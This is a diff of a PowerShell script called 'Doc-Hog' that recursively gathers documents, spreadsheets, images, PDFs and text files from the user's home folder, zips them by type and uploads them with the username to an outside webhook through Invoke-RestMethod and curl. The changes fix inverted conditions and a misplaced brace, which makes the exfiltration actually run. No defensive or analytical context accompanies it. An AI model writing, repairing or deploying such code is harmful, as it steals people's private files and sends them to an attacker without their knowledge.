@@ -1,26 +1,27 @@
 ﻿function Doc-Hog {
     [CmdletBinding()]
     param (
-        [parameter(Position=0,Mandatory=$false)]
+        [parameter(Position=0,Mandatory=$False)]
         [string]$file,
-        [parameter(Position=1,Mandatory=$false)]
+        [parameter(Position=1,Mandatory=$False)]
         [string]$text 
     )
 
     $Body = @{
-        username = $env:username
-        content = $text
+        'username' = $env:username
+        'content' = $text
     }
 
-    if ([string]::IsNullOrEmpty($text)) {
+    if (-not ([string]::IsNullOrEmpty($text))) {
         # Send text to webhook
         Invoke-RestMethod -ContentType "application/json" -Uri $dc  -Method Post -Body (ConvertTo-Json $Body)
     }
 
-    if ([string]::IsNullOrEmpty($file)) {
+    if (-not ([string]::IsNullOrEmpty($file))) {
         # Send file to webhook
-        curl.exe -F "File=@$(Resolve-Path $file)" $dc
+        curl.exe -F "file=@$(Resolve-Path $file)" $dc
     }
+}
 
 $Files = Get-ChildItem -Path "$env:HOMEPATH" -Include "*.docx","*.doc","*.pptx","*.xlsx","*.pdf","*.jpeg","*.png","*.jpg","*.csv","*.txt" -Recurse
 
@@ -47,5 +48,4 @@ foreach ($type in $types.Keys) {
 
         Doc-Hog -file $zipFile -text "Uploading $($types[$type]) files"
     }
-}
 }
